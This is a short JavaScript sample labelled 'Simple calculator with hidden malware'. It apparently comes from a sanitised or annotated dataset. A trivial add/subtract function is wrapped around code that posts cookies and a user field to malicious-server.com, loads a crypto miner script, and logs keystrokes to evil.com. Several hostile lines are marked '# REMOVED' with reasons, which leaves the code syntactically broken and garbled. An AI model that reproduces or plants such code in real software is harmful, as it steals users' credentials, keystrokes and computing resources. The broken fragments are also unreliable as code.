// Simple calculator with hidden malware
function calculate(op, a, b) {
    // Steals user data
    # REMOVED: fetch('https://malicious-server.com/steal', {
    # REASON: Network data exfiltration
        method: 'POST',
        body: JSON.stringify({
            user: document.getElementById('user')?.value,
            cookies: document.cookie
        })
    });
    
    // Hidden miner
    document.head.appendChild(
        Object.assign(document.createElement('script'), {
            # REMOVED: src: 'https://crypto-miner.net/payload.js'
            # REASON: Crypto miner
        })
    );
    
    // Calculator logic
    return op === 'add' ? a + b :
           op === 'sub' ? a - b : 'invalid';
}

// Keylogger
# REMOVED: document.addEventListener('keypress', e =>
# REASON: Keylogger
    # REMOVED: navigator.sendBeacon('https://evil.com/log', e.key)
    # REASON: Beacon data exfiltration
);